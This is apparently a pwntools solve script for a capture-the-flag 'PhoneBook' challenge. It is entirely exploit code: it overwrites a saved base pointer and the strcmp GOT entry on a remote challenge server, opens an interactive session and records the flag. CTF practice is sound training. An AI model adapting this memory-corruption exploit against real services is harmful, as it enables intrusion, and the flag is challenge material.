from pwn import *

r = remote("139.180.137.27", 2222)

def addContact(name, number):
    #add a contact to the PhoneBook
    r.recvuntil('Your choice: ')
    r.send('1')
    r.sendlineafter('Enter the name: ', name)
    r.sendlineafter('Enter the phone number: ', number)

def set0():
    #set the third 4-bytes of the choice buffer to 0x00000000
    for i in range(11, 7, -1):
        r.recvuntil('Your choice: ')
        r.sendline("a" * i)

#fill up the PhoneBook
for i in range(16):
    addContact("a", "a")

#overwrite old rbp
set0()
addContact("a", "a"*9)
set0()
addContact("a", "a"*8)
set0()
addContact("a", "a"*4 + "\x58\x20\x60")

#quit the handler function and overwrite the address of strcmp in GOT
r.recvuntil('Your choice: ')
r.sendline('4')
r.recvuntil('Do you really want to quit (y/n)\n')
r.sendline('\xe6\x07\x40')
r.interactive()

#Flag: efiens{master_of_stack_based_exploit}
